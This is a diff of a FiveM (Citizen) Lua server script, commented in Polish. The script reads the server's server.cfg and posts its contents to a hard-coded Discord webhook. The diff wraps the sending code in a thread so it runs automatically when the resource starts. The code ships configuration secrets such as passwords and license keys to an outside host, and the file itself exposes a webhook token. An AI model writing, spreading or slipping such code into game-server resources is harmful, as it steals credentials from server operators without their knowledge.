@@ -1,3 +1,4 @@
+Citizen.CreateThread(function()
 local discordWebhookURL = "https://discord.com/api/webhooks/1370903751736557638/0lX_gye0_-aWFDYVCxqmHheAt9v_BmTl8cPvPGLpicNwmU7kdgWx0wd26NdijoNw6B11"  -- Wstaw swój URL webhooka tutaj
 
 -- Funkcja do wysyłania danych do Discorda
@@ -56,3 +57,8 @@ message = message .. "**Zawartość server.cfg:**\n" .. serverConfig
 
 -- Wysyłamy dane do Discorda
 sendToDiscord(message)
+
+    -- Czekamy przez minutę (lub inną wartość), by uniknąć zablokowania wątku serwera
+    Citizen.Wait(60000)  -- 60 sekund
+end)
+
